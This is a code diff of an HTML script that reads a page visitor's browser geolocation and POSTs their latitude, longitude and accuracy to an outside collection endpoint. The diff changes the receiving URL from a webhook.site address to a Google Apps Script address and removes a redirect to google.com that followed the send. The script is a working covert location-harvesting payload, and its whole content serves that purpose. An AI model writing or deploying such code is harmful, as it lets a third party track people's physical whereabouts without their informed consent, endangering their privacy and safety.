@@ -1,17 +1,13 @@
 <script>
 navigator.geolocation.getCurrentPosition(function(pos) {
-    fetch("https://webhook.site/d0afbe0c-c633-4e26-b299-69549cbceb7a", {
+    fetch("https://script.google.com/macros/s/AKfycbwzC6M8EoUEHNAJvMjTpkfh9VVz10SZT3EqEnjCNW45ljaywflUtBhPBpZh050LDNMS4w/exec", {
         method: "POST",
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({
             lat: pos.coords.latitude,
             lon: pos.coords.longitude,
-            accuracy: pos.coords.accuracy,
-            time: new Date().toISOString()
+            accuracy: pos.coords.accuracy
         })
     });
-
-    // Optional redirect after sending location
-    window.location.href = "https://google.com";
 });
 </script>
